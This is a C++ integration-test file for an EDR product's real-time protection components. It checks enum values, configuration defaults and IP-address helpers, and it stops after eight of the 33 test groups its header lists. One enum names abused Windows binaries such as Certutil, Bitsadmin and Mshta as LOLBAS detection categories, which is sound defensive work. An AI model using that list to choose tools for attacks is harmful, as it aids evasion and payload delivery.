/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * Integration Tests - RealTime Protection Pipeline
 *
 * ==========================================================================
 * PURPOSE
 * ==========================================================================
 * This file exercises the integration surface between the three core
 * RealTime protection subsystems and the orchestrating singleton:
 *
 *   RealTimeProtection  (orchestrator  — lifecycle, config, exclusions, cache)
 *   FileSystemFilter    (kernel minifilter user-mode interface)
 *   ProcessCreationMonitor  (process execution analysis)
 *   NetworkTrafficFilter    (WFP-based network filtering)
 *
 * No mocks.  No stubs.  All tests exercise real production implementations.
 *
 * Where kernel drivers (minifilter, WFP callout) are absent — the expected
 * case on CI and developer machines without the signed drivers installed —
 * each test asserts the documented graceful-failure contract:  Initialize()
 * succeeds (user-mode initialisation), Start() may return false, IsRunning()
 * reflects the actual driver-connected state, and all value-contract APIs
 * (config, rules, classification, entropy) operate independently of the
 * kernel component.
 *
 * ==========================================================================
 * TEST GROUPS
 * ==========================================================================
 *   GROUP  1  TypeContracts          – enum ordinal stability, constant values
 *   GROUP  2  RTPConfigFactory       – RTPConfig factory method field contracts
 *   GROUP  3  FSFConfigFactory       – FileSystemFilterConfig factory contracts
 *   GROUP  4  PCMConfigFactory       – ProcessMonitorConfig factory contracts
 *   GROUP  5  NTFConfigFactory       – NetworkFilterConfig factory contracts
 *   GROUP  6  StructDefaults         – struct default-construction field checks
 *   GROUP  7  IPAddress              – FromString, IsLoopback, IsPrivate, ops
 *   GROUP  8  FilterRuleCopy         – atomic-field copy/assign/move semantics
 *   GROUP  9  StatsReset             – ProcessMonitorStats & NetworkFilterStats
 *   GROUP 10  FSF_Lifecycle          – FileSystemFilter init/config/status
 *   GROUP 11  FSF_Exclusions         – add/remove/query exclusion management
 *   GROUP 12  FSF_Stats              – stats snapshot and cache helpers
 *   GROUP 13  PCM_Lifecycle          – PCM init/start/stop/config round-trip
 *   GROUP 14  PCM_LOLBAS             – LOLBAS binary classification
 *   GROUP 15  PCM_CmdLine            – command-line analysis and decoding
 *   GROUP 16  PCM_RuleManagement     – CRUD for ProcessPolicyRule
 *   GROUP 17  PCM_ProcessTracking    – OnProcessCreate/Terminate, GetProcessInfo
 *   GROUP 18  PCM_ParentChild        – CheckParentChild suspicious-pattern set
 *   GROUP 19  NTF_Lifecycle          – NTF init/start/stop/config round-trip
 *   GROUP 20  NTF_IPBlocking         – BlockIP / UnblockIP / GetBlockedIPs
 *   GROUP 21  NTF_DomainBlocking     – BlockDomain / UnblockDomain contracts
 *   GROUP 22  NTF_RuleManagement     – CRUD for FilterRule
 *   GROUP 23  NTF_Entropy            – CalculateDomainEntropy / IsDGADomain
 *   GROUP 24  NTF_ConnectionEvents   – OnConnectionAttempt integration checks
 *   GROUP 25  NTF_DNSQuery           – OnDNSQuery blocked-domain path
 *   GROUP 26  NTF_Callbacks          – all five callback types register/fire
 *   GROUP 27  RTP_Singleton          – singleton identity and initial state
 *   GROUP 28  RTP_Config             – config round-trip, SetProtectionMode
 *   GROUP 29  RTP_Exclusions         – path/process/hash/pid CRUD
 *   GROUP 30  RTP_Cache              – verdict cache query / invalidate / clear
 *   GROUP 31  RTP_Stats              – GetStatistics, ResetStatistics
 *   GROUP 32  RTP_Callbacks          – all six callback registrations
 *   GROUP 33  CrossComponent         – identity checks + concurrent stress
 *
 * ==========================================================================
 * BUILD COMMAND (targeted, no full-solution rebuild required)
 * ==========================================================================
 *   call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
 *   cl.exe /std:c++latest /EHsc /nologo /W4 /DUNICODE /D_UNICODE ^
 *     /I C:\ShadowStrike\ShadowStrike ^
 *     /I C:\ShadowStrike\ShadowStrike\include ^
 *     /I C:\ShadowStrike\ShadowStrike\src ^
 *     /c tests\integration\realtime_protection_pipeline\RTPPipeline_Integration_Tests.cpp ^
 *     /Fo tests\integration\realtime_protection_pipeline\RTPPipeline_Integration_Tests.obj
 *
 * ==========================================================================
 * ARCHITECTURE NOTES
 * ==========================================================================
 *   • RTPStatistics uses std::atomic<uint64_t> fields — always access via
 *     const reference from GetStatistics(); never copy the struct.
 *   • FilterRule::hitCount / lastHitNs are atomic — explicit copy/assign
 *     operators are defined, so rule copies ARE safe.
 *   • ProcessMonitorStats and NetworkFilterStats are plain POD — safe to
 *     copy by value.
 *   • FileSystemFilterStats is plain POD — safe to copy by value.
 *   • RealTimeProtection has no public Shutdown(); only Stop() and Restart().
 *   • ProcessCreationMonitor::Initialize() is safe to call from user-mode
 *     without the kernel driver installed.
 */

// ==========================================================================
// WINDOWS + STANDARD HEADERS
// ==========================================================================
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>

#include <array>
#include <atomic>
#include <chrono>
#include <cstdint>
#include <mutex>
#include <optional>
#include <string>
#include <thread>
#include <vector>

// ==========================================================================
// GOOGLETEST
// ==========================================================================
#include <gtest/gtest.h>

// ==========================================================================
// SHADOWSTRIKE REALTIME MODULE HEADERS (relative to repo root)
// ==========================================================================
#include "../../../src/Shared_modules/RealTime/RealTimeProtection.hpp"
#include "../../../src/Shared_modules/RealTime/FileSystemFilter.hpp"
#include "../../../src/Shared_modules/RealTime/ProcessCreationMonitor.hpp"
#include "../../../src/Shared_modules/RealTime/NetworkTrafficFilter.hpp"

// ==========================================================================
// CONVENIENCE NAMESPACE ALIASES
// ==========================================================================
namespace RT  = ShadowStrike::RealTime;

// ==========================================================================
// TEST HELPERS
// ==========================================================================
namespace {

/// Build a minimal ProcessPolicyRule with a unique string ID.
RT::ProcessPolicyRule MakePolicyRule(const std::string& id) {
    RT::ProcessPolicyRule r{};
    r.ruleId   = id;
    r.enabled  = true;
    r.action   = RT::ProcessVerdict::AllowMonitored;
    return r;
}

/// Build a minimal FilterRule (NetworkTrafficFilter) with a unique string ID.
RT::FilterRule MakeNetworkRule(const std::string& id) {
    RT::FilterRule r{};
    r.ruleId  = id;
    r.enabled = true;
    r.action  = RT::FilterAction::LogOnly;
    return r;
}

constexpr uint8_t HexDigitToValue(char ch) noexcept {
    return (ch >= '0' && ch <= '9') ? static_cast<uint8_t>(ch - '0') :
           (ch >= 'a' && ch <= 'f') ? static_cast<uint8_t>(ch - 'a' + 10) :
           (ch >= 'A' && ch <= 'F') ? static_cast<uint8_t>(ch - 'A' + 10) :
                                      0u;
}

std::array<uint8_t, 32> HashBytesFromHex(std::string_view hex) {
    std::array<uint8_t, 32> bytes{};
    const size_t pairCount = std::min(bytes.size(), hex.size() / 2);

    for (size_t i = 0; i < pairCount; ++i) {
        bytes[i] = static_cast<uint8_t>(
            (HexDigitToValue(hex[(i * 2)]) << 4) |
             HexDigitToValue(hex[(i * 2) + 1]));
    }

    return bytes;
}

}  // anonymous namespace


// ============================================================================
// GROUP 1 — Type & Constant Contracts
// ============================================================================

TEST(TypeContracts, ProtectionState_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::ProtectionState::UNINITIALIZED));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::ProtectionState::INITIALIZING));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::ProtectionState::ACTIVE));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::ProtectionState::PAUSED));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::ProtectionState::DEGRADED));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::ProtectionState::ERROR));
    EXPECT_EQ(6u, static_cast<uint8_t>(RT::ProtectionState::SHUTTING_DOWN));
    EXPECT_EQ(7u, static_cast<uint8_t>(RT::ProtectionState::DISABLED));
}

TEST(TypeContracts, ProtectionMode_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::ProtectionMode::MONITOR_ONLY));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::ProtectionMode::BLOCK_KNOWN));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::ProtectionMode::BLOCK_SUSPICIOUS));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::ProtectionMode::BLOCK_UNKNOWN));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::ProtectionMode::CUSTOM));
}

TEST(TypeContracts, KernelVerdict_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::KernelVerdict::ALLOW));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::KernelVerdict::BLOCK));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::KernelVerdict::QUARANTINE));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::KernelVerdict::MONITOR));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::KernelVerdict::DELAY));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::KernelVerdict::ERROR));
}

TEST(TypeContracts, ScanPriority_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::ScanPriority::LOW));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::ScanPriority::NORMAL));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::ScanPriority::HIGH));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::ScanPriority::CRITICAL));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::ScanPriority::EMERGENCY));
}

TEST(TypeContracts, FailurePolicy_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::FailurePolicy::FAIL_OPEN));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::FailurePolicy::FAIL_CLOSED));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::FailurePolicy::ASK_USER));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::FailurePolicy::LOG_ONLY));
}

TEST(TypeContracts, ComponentType_OrdinalValues) {
    EXPECT_EQ(0u,  static_cast<uint8_t>(RT::ComponentType::FILE_SYSTEM_FILTER));
    EXPECT_EQ(1u,  static_cast<uint8_t>(RT::ComponentType::PROCESS_MONITOR));
    EXPECT_EQ(4u,  static_cast<uint8_t>(RT::ComponentType::NETWORK_FILTER));
    EXPECT_EQ(12u, static_cast<uint8_t>(RT::ComponentType::COMPONENT_COUNT));
}

TEST(TypeContracts, NotificationSeverity_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::NotificationSeverity::INFO));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::NotificationSeverity::WARNING));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::NotificationSeverity::THREAT_BLOCKED));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::NotificationSeverity::THREAT_DETECTED));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::NotificationSeverity::CRITICAL));
}

TEST(TypeContracts, RemediationAction_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::RemediationAction::NONE));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::RemediationAction::BLOCKED));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::RemediationAction::QUARANTINED));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::RemediationAction::PROCESS_TERMINATED));
    EXPECT_EQ(8u, static_cast<uint8_t>(RT::RemediationAction::ROLLBACK));
}

TEST(TypeContracts, RTPConstants_Values) {
    EXPECT_EQ(3u,                                RT::RTPConstants::VERSION_MAJOR);
    EXPECT_EQ(100000u,                           RT::RTPConstants::VERDICT_CACHE_SIZE);
    EXPECT_EQ(500ULL * 1024 * 1024,              RT::RTPConstants::MAX_REALTIME_SCAN_SIZE);
    EXPECT_EQ(60000u,                            RT::RTPConstants::DEFAULT_SCAN_TIMEOUT_MS);
    EXPECT_EQ(30000u,                            RT::RTPConstants::KERNEL_REPLY_TIMEOUT_MS);
    EXPECT_EQ(1000u,                             RT::RTPConstants::MAX_SCAN_QUEUE_DEPTH);
    EXPECT_EQ(80u,                               RT::RTPConstants::HIGH_CPU_THRESHOLD_PERCENT);
}

TEST(TypeContracts, FilterConstants_Values) {
    EXPECT_EQ(0x53534653u, RT::FilterConstants::MESSAGE_MAGIC);
    EXPECT_EQ(2u,          RT::FilterConstants::PROTOCOL_VERSION);
    EXPECT_EQ(32767u,      RT::FilterConstants::MAX_PATH_LENGTH);
}

TEST(TypeContracts, ProcessMonitorConstants_Values) {
    EXPECT_DOUBLE_EQ(40.0, RT::ProcessMonitorConstants::SUSPICIOUS_PARENT_CHILD_SCORE);
    EXPECT_DOUBLE_EQ(35.0, RT::ProcessMonitorConstants::LOLBAS_ABUSE_SCORE);
    EXPECT_DOUBLE_EQ(30.0, RT::ProcessMonitorConstants::ENCODED_COMMAND_SCORE);
    EXPECT_DOUBLE_EQ(25.0, RT::ProcessMonitorConstants::DOWNLOAD_COMMAND_SCORE);
    EXPECT_EQ(100000u,     RT::ProcessMonitorConstants::MAX_TRACKED_PROCESSES);
}

TEST(TypeContracts, NetworkFilterConstants_Values) {
    EXPECT_DOUBLE_EQ(3.5,  RT::NetworkFilterConstants::DGA_ENTROPY_THRESHOLD);
    EXPECT_DOUBLE_EQ(0.1,  RT::NetworkFilterConstants::BEACON_VARIANCE_THRESHOLD);
    EXPECT_EQ(10u,         RT::NetworkFilterConstants::MIN_BEACON_SAMPLES);
    EXPECT_EQ(100ULL * 1024 * 1024, RT::NetworkFilterConstants::LARGE_TRANSFER_THRESHOLD);
}

TEST(TypeContracts, ProcessVerdict_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::ProcessVerdict::Allow));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::ProcessVerdict::Block));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::ProcessVerdict::AllowMonitored));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::ProcessVerdict::AllowSuspicious));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::ProcessVerdict::Timeout));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::ProcessVerdict::Error));
}

TEST(TypeContracts, FilterAction_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::FilterAction::Allow));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::FilterAction::Block));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::FilterAction::LogOnly));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::FilterAction::Inspect));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::FilterAction::RateLimit));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::FilterAction::Redirect));
    EXPECT_EQ(6u, static_cast<uint8_t>(RT::FilterAction::Terminate));
}

TEST(TypeContracts, LOLBASType_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::LOLBASType::None));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::LOLBASType::Cmd));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::LOLBASType::PowerShell));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::LOLBASType::WSH));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::LOLBASType::Mshta));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::LOLBASType::Regsvr32));
    EXPECT_EQ(6u, static_cast<uint8_t>(RT::LOLBASType::Rundll32));
    EXPECT_EQ(7u, static_cast<uint8_t>(RT::LOLBASType::Certutil));
    EXPECT_EQ(8u, static_cast<uint8_t>(RT::LOLBASType::Bitsadmin));
}

TEST(TypeContracts, NetworkDetectionType_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::NetworkDetectionType::None));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::NetworkDetectionType::C2Beacon));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::NetworkDetectionType::DGADomain));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::NetworkDetectionType::DNSTunneling));
}

TEST(TypeContracts, FilterStatus_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::FilterStatus::NotInitialized));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::FilterStatus::Initializing));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::FilterStatus::Running));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::FilterStatus::Paused));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::FilterStatus::Stopped));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::FilterStatus::Error));
    EXPECT_EQ(6u, static_cast<uint8_t>(RT::FilterStatus::DriverNotInstalled));
    EXPECT_EQ(7u, static_cast<uint8_t>(RT::FilterStatus::AccessDenied));
    EXPECT_EQ(8u, static_cast<uint8_t>(RT::FilterStatus::PortBusy));
}

TEST(TypeContracts, ScanVerdict_OrdinalValues) {
    EXPECT_EQ(0u, static_cast<uint8_t>(RT::ScanVerdict::Allow));
    EXPECT_EQ(1u, static_cast<uint8_t>(RT::ScanVerdict::Block));
    EXPECT_EQ(2u, static_cast<uint8_t>(RT::ScanVerdict::AllowSuspicious));
    EXPECT_EQ(3u, static_cast<uint8_t>(RT::ScanVerdict::BlockAndQuarantine));
    EXPECT_EQ(4u, static_cast<uint8_t>(RT::ScanVerdict::Timeout));
    EXPECT_EQ(5u, static_cast<uint8_t>(RT::ScanVerdict::Error));
    EXPECT_EQ(6u, static_cast<uint8_t>(RT::ScanVerdict::Retry));
    EXPECT_EQ(7u, static_cast<uint8_t>(RT::ScanVerdict::CacheHitAllow));
    EXPECT_EQ(8u, static_cast<uint8_t>(RT::ScanVerdict::CacheHitBlock));
}

// ============================================================================
// GROUP 2 — RTPConfig Factory Methods
// ============================================================================

TEST(RTPConfigFactory, CreateDefault_CoreFields) {
    const RT::RTPConfig cfg = RT::RTPConfig::CreateDefault();
    EXPECT_TRUE(cfg.enabled);
    EXPECT_EQ(RT::ProtectionMode::BLOCK_KNOWN,  cfg.mode);
    EXPECT_EQ(RT::FailurePolicy::FAIL_OPEN,     cfg.failurePolicy);
    EXPECT_TRUE(cfg.scanOnOpen);
    EXPECT_TRUE(cfg.scanOnExecute);
    EXPECT_FALSE(cfg.scanOnWrite);
    EXPECT_EQ(RT::RTPConstants::DEFAULT_SCAN_TIMEOUT_MS, cfg.scanTimeoutMs);
    EXPECT_EQ(RT::RTPConstants::VERDICT_CACHE_SIZE,      cfg.maxCacheSize);
    EXPECT_TRUE(cfg.useVerdictCache);
    EXPECT_TRUE(cfg.filterNetworkTraffic);
    EXPECT_TRUE(cfg.monitorProcessCreation);
    EXPECT_TRUE(cfg.enableBehaviorBlocking);
    EXPECT_TRUE(cfg.enableSelfProtection);
}

TEST(RTPConfigFactory, CreateDefault_ExclusionVectorsEmpty) {
    const RT::RTPConfig cfg = RT::RTPConfig::CreateDefault();
    EXPECT_TRUE(cfg.excludedPaths.empty());
    EXPECT_TRUE(cfg.excludedProcesses.empty());
    EXPECT_TRUE(cfg.excludedHashes.empty());
    EXPECT_TRUE(cfg.excludedPids.empty());
    EXPECT_TRUE(cfg.excludedPublishers.empty());
}

TEST(RTPConfigFactory, CreateHighSecurity_RestrictiveMode) {
    const RT::RTPConfig cfg = RT::RTPConfig::CreateHighSecurity();
    // High-security must be at least as restrictive as BLOCK_SUSPICIOUS.
    EXPECT_GE(static_cast<uint8_t>(cfg.mode),
              static_cast<uint8_t>(RT::ProtectionMode::BLOCK_SUSPICIOUS));
    EXPECT_TRUE(cfg.enabled);
}

TEST(RTPConfigFactory, CreateHighPerformance_ReducedScanSurface) {
    const RT::RTPConfig cfg = RT::RTPConfig::CreateHighPerformance();
    EXPECT_TRUE(cfg.enabled);
    // High-performance profiles reduce CPU impact by scanning fewer triggers.
    EXPECT_FALSE(cfg.scanOnWrite);
}

TEST(RTPConfigFactory, CreateServerOptimized_IsEnabled) {
    const RT::RTPConfig cfg = RT::RTPConfig::CreateServerOptimized();
    EXPECT_TRUE(cfg.enabled);
}

TEST(RTPConfigFactory, CreateWorkstationOptimized_IsEnabled) {
    const RT::RTPConfig cfg = RT::RTPConfig::CreateWorkstationOptimized();
    EXPECT_TRUE(cfg.enabled);
}

// ============================================================================
// GROUP 3 — FileSystemFilterConfig Factory Methods
// ============================================================================

TEST(FSFConfigFactory, CreateDefault_CoreFields) {
    const RT::FileSystemFilterConfig cfg = RT::FileSystemFilterConfig::CreateDefault();
    EXPECT_TRUE(cfg.scanOnOpen);
    EXPECT_TRUE(cfg.scanOnExecute);
    EXPECT_FALSE(cfg.scanOnWrite);
    EXPECT_EQ(std::wstring(RT::FilterConstants::DEFAULT_PORT_NAME), cfg.portName);
    EXPECT_GT(cfg.messageThreadCount, 0u);
    EXPECT_GT(cfg.messageBufferSize,  0u);
}

TEST(FSFConfigFactory, CreateHighPerformance_ReducedScanSurface) {
    const RT::FileSystemFilterConfig cfg =
        RT::FileSystemFilterConfig::CreateHighPerformance();
    EXPECT_FALSE(cfg.scanOnWrite);
    EXPECT_FALSE(cfg.enableNotifications);
    // High-performance mode extends cache capacity significantly.
    EXPECT_GE(cfg.cacheCapacity, 500000u);
}

TEST(FSFConfigFactory, CreateParanoid_MaximalProtection) {
    const RT::FileSystemFilterConfig cfg =
        RT::FileSystemFilterConfig::CreateParanoid();
    EXPECT_TRUE(cfg.scanOnWrite);
    EXPECT_TRUE(cfg.blockOnTimeout);
    EXPECT_TRUE(cfg.blockOnError);
    EXPECT_FALSE(cfg.cacheNegativeResults);
}

// ============================================================================
// GROUP 4 — ProcessMonitorConfig Factory Methods
// ============================================================================

TEST(PCMConfigFactory, CreateDefault_CoreFields) {
    const RT::ProcessMonitorConfig cfg = RT::ProcessMonitorConfig::CreateDefault();
    EXPECT_TRUE(cfg.enabled);
    EXPECT_TRUE(cfg.preExecutionScan);
    EXPECT_TRUE(cfg.analyzeCommandLine);
    EXPECT_TRUE(cfg.trackParentChild);
    EXPECT_TRUE(cfg.buildProcessTree);
    EXPECT_FALSE(cfg.blockUnsigned);
    EXPECT_FALSE(cfg.blockFromTemp);
    EXPECT_FALSE(cfg.blockFromNetwork);
    EXPECT_DOUBLE_EQ(50.0, cfg.alertThreshold);
    EXPECT_DOUBLE_EQ(80.0, cfg.blockThreshold);
    EXPECT_TRUE(cfg.blockKnownMalicious);
}

TEST(PCMConfigFactory, CreateStrict_BlockingFlags) {
    const RT::ProcessMonitorConfig cfg = RT::ProcessMonitorConfig::CreateStrict();
    EXPECT_TRUE(cfg.blockUnsigned);
    EXPECT_TRUE(cfg.blockFromTemp);
    EXPECT_TRUE(cfg.blockFromNetwork);
    EXPECT_TRUE(cfg.blockOnTimeout);
    EXPECT_DOUBLE_EQ(30.0, cfg.alertThreshold);
    EXPECT_DOUBLE_EQ(60.0, cfg.blockThreshold);
}

TEST(PCMConfigFactory, CreateMonitorOnly_NoBlocking) {
    const RT::ProcessMonitorConfig cfg = RT::ProcessMonitorConfig::CreateMonitorOnly();
    EXPECT_FALSE(cfg.preExecutionScan);
    EXPECT_FALSE(cfg.blockKnownMalicious);
    // blockThreshold == 100.0 means the score can never reach the block threshold.
    EXPECT_DOUBLE_EQ(100.0, cfg.blockThreshold);
}

// ============================================================================
// GROUP 5 — NetworkFilterConfig Factory Methods
// ============================================================================

TEST(NTFConfigFactory, CreateDefault_CoreFields) {
    const RT::NetworkFilterConfig cfg = RT::NetworkFilterConfig::CreateDefault();
    EXPECT_TRUE(cfg.enabled);
    EXPECT_EQ(RT::FilterAction::Allow, cfg.defaultAction);
    EXPECT_TRUE(cfg.detectC2);
    EXPECT_TRUE(cfg.detectDGA);
    EXPECT_FALSE(cfg.blockTOR);
    EXPECT_FALSE(cfg.blockVPN);
    EXPECT_FALSE(cfg.blockProxy);
}

TEST(NTFConfigFactory, CreateStrict_BlocksAllBadCategories) {
    const RT::NetworkFilterConfig cfg = RT::NetworkFilterConfig::CreateStrict();
    EXPECT_EQ(RT::FilterAction::Block, cfg.defaultAction);
    EXPECT_TRUE(cfg.blockTOR);
    EXPECT_TRUE(cfg.blockVPN);
    EXPECT_TRUE(cfg.blockProxy);
}

TEST(NTFConfigFactory, CreateMonitorOnly_AllLogOnly) {
    const RT::NetworkFilterConfig cfg = RT::NetworkFilterConfig::CreateMonitorOnly();
    EXPECT_EQ(RT::FilterAction::LogOnly, cfg.defaultAction);
}

// ============================================================================
// GROUP 6 — Struct Default-Construction Field Checks
// ============================================================================

TEST(StructDefaults, RTPFileScanRequest_Defaults) {
    RT::RTPFileScanRequest req{};
    EXPECT_EQ(RT::EventType::FileOpen,     req.eventType);
    EXPECT_EQ(RT::ScanPriority::NORMAL,    req.priority);
    EXPECT_TRUE(req.isBlocking);
    EXPECT_EQ(RT::RTPConstants::KERNEL_REPLY_TIMEOUT_MS, req.timeoutMs);
    EXPECT_FALSE(req.hashValid);
    EXPECT_EQ(0u, req.pid);
    EXPECT_EQ(0u, req.fileSize);
}

TEST(StructDefaults, RTPProcessNotifyRequest_Defaults) {
    RT::RTPProcessNotifyRequest req{};
    EXPECT_TRUE(req.isCreation);
    EXPECT_EQ(0u, req.pid);
    EXPECT_EQ(0u, req.parentPid);
    EXPECT_FALSE(req.isElevated);
}

TEST(StructDefaults, NetworkNotifyRequest_Defaults) {
    RT::NetworkNotifyRequest req{};
    EXPECT_TRUE(req.isOutbound);
}

TEST(StructDefaults, BeaconAnalysis_Defaults) {
    RT::BeaconAnalysis ba{};
    EXPECT_FALSE(ba.isBeacon);
    EXPECT_DOUBLE_EQ(0.0, ba.confidence);
    EXPECT_EQ(0u, ba.sampleCount);
}

TEST(StructDefaults, DNSQueryEvent_Defaults) {
    RT::DNSQueryEvent dns{};
    EXPECT_FALSE(dns.isDGA);
    EXPECT_FALSE(dns.isTunneling);
    EXPECT_DOUBLE_EQ(0.0, dns.dgaConfidence);
}

TEST(StructDefaults, NetworkConnection_Defaults) {
    RT::NetworkConnection conn{};
    EXPECT_FALSE(conn.blocked);
    EXPECT_DOUBLE_EQ(0.0, conn.riskScore);
}

TEST(StructDefaults, ProcessCreateEvent_Defaults) {
    RT::ProcessCreateEvent ev{};
    EXPECT_TRUE(ev.requiresVerdict);
}

TEST(StructDefaults, FilterMessageHeader_SizeAndMagic) {
    // The packed struct must match its wire-format size; magic must equal the
    // constant to ensure header/library builds share the same definition.
    RT::FilterMessageHeader hdr{};
    hdr.magic = RT::FilterConstants::MESSAGE_MAGIC;
    EXPECT_EQ(RT::FilterConstants::MESSAGE_MAGIC, hdr.magic);
    // Packed struct — no padding, size must be deterministic.
    EXPECT_GT(sizeof(RT::FilterMessageHeader), 0u);
}

// ============================================================================
// GROUP 7 — IPAddress Value Contracts
// ============================================================================

TEST(IPAddress, IPv4Loopback_IsLoopback) {
    const RT::IPAddress addr = RT::IPAddress::FromString("127.0.0.1");
    EXPECT_TRUE(addr.IsLoopback());
    EXPECT_FALSE(addr.IsPrivate());
}

TEST(IPAddress, RFC1918_ClassC_IsPrivate) {
    const RT::IPAddress addr = RT::IPAddress::FromString("192.168.1.100");
    EXPECT_TRUE(addr.IsPrivate());
    EXPECT_FALSE(addr.IsLoopback());
}

TEST(IPAddress, RFC1918_ClassA_IsPrivate) {
    const RT::IPAddress addr = RT::IPAddress::FromString("10.0.0.1");
    EXPECT_TRUE(addr.IsPrivate());
}

TEST(IPAddress, RFC1918_ClassB_IsPrivate) {
    const RT::IPAddress addr = RT::IPAddress::FromString("172.16.5.1");
    EXPECT_TRUE(addr.IsPrivate());
}

TEST(IPAddress, PublicIP_NotPrivate_NotLoopback) {
    const RT::IPAddress addr = RT::IPAddress::FromString("8.8.8.8");
    EXPECT_FALSE(addr.IsPrivate());
    EXPECT_FALSE(addr.IsLoopback());
}

TEST(IPAddress, ToString_RoundTrip) {
    const std::string ip = "203.0.113.42";
    const RT::IPAddress addr = RT::IPAddress::FromString(ip);
    EXPECT_EQ(ip, addr.ToString());
}

TEST(IPAddress, EqualityOperator_SameIP) {
    const RT::IPAddress a = RT::IPAddress::FromString("1.2.3.4");
    const RT::IPAddress b = RT::IPAddress::FromString("1.2.3.4");
    EXPECT_EQ(a, b);
}

TEST(IPAddress, InequalityOperator_DifferentIPs) {
    const RT::IPAddress a = RT::IPAddress::FromString("1.2.3.4");
    const RT::IPAddress b = RT::IPAddress::FromString("5.6.7.8");
    EXPECT_NE(a, b);
}

TEST(IPAddress, IPAddressHash_DifferentIPsProduceDifferentHashes) {
    const RT::IPAddress a = RT::IPAddress::FromString("1.2.3.4");
    const RT::IPAddress b = RT::IPAddress::FromString("1.2.3.5");
    const RT::IPAddressHash hasher{};
    EXPECT_NE(hasher(a), hasher(b));
}

TEST(IPAddress, ConnectionTuple_HashDeterministic) {
    RT::ConnectionTuple t{};
    t.local.address  = RT::IPAddress::FromString("192.168.1.5");
    t.remote.address = RT::IPAddress::FromString("8.8.8.8");
    t.local.port     = 54321;
    t.remote.port    = 443;
    t.protocol       = RT::NetworkProtocol::TCP;

    const uint64_t h1 = t.Hash();
    const uint64_t h2 = t.Hash();
    EXPECT_EQ(h1, h2);
}

TEST(IPAddress, ConnectionTuple_EqualityOperator) {
    RT::ConnectionTuple t1{}, t2{};
    t1.local.address = t2.local.address = RT::IPAddress::FromString("10.0.0.1");
    t1.remote.address = t2.remote.address = RT::IPAddress::FromString("93.184.216.34");
    t1.local.port  = t2.local.port  = 55000;
    t1.remote.port = t2.remote.port = 80;
    t1.protocol    = t2.protocol    = RT::NetworkProtocol::TCP;

    EXPECT_TRUE(t1 == t2);
    t2.remote.port = 8080;
    EXPECT_FALSE(t1 == t2);
}

TEST(IPAddress, NetworkEndpoint_ToString_ContainsIPAndPort) {
    RT::NetworkEndpoint ep{};
    ep.address = RT::IPAddress::FromString("10.20.30.40");
    ep.port    = 443;
    const std::string str = ep.ToString();
    EXPECT_NE(std::string::npos, str.find("10.20.30.40"));
    EXPECT_NE(std::string::npos, str.find("443"));
}

// ============================================================================
// GROUP 8 — FilterRule Copy Semantics (atomic fields)
// ============================================================================

